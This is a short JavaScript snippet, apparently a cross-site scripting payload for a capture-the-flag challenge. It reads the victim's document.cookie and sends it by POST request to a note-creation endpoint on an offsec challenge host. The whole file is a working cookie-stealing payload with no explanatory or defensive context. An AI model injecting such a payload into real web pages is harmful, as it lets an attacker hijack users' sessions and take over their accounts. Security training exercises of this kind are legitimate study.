var url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new";
var params = "title=abc1&content=" + document.cookie + "&submit=save";
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);

//Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhr.send(params);
